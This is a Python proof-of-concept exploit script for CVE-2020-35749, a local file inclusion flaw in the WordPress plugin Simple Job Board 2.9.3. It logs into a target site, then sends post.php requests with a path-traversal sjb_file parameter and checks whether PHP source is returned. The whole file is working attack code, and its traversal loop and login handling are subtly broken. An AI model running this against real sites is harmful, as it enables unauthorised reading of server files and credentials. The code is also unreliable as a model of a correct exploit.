# coding: utf-8
import requests
import datetime

#Wordpress Plugin Simple Job Board 2.9.3 - Local File Inclusion
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")
    # Authentication:
    session = requests.Session()
    auth_url=url+'/wp-login.php'
    redirecto = url + "/wp-admin/"
    username=logindict.keys()
    password=logindict.values()
    header = {
        'User-Agent': user_agent
    }
    data = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': redirecto, 'testcookie': '1'}
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        auth  = session.post(auth_url, headers=header, data=data, proxies=proxies)
    else:
        auth  = session.post(auth_url, headers=header, data=data)

    #漏洞位置
    fetch_path='index.php'
    exploit_url=url+'/wp-admin/post.php?post=application_id&action=edit&sjb_file='+fetch_path
    i=0
    for i in range(9):

        if proxy:
            proxies = {
                "http": "http://%(proxy)s/" % {'proxy': proxy},
                "https": "http://%(proxy)s/" % {'proxy': proxy}
            }
            response = session.get(exploit_url, headers=header, proxies=proxies)
        else:
            response = session.get(exploit_url, headers=header)
        fetch_path+='../'
        if response.status_code==200 and "<?php" in response.text:
            return "Wordpress Plugin Simple Job Board 2.9.3 - 本地文件包含    漏洞编号：CVE-2020-35749"


def run(url,logindict,user_agent,proxies):
    if logindict:
        result = poc(url,logindict,user_agent,proxies)
        return result


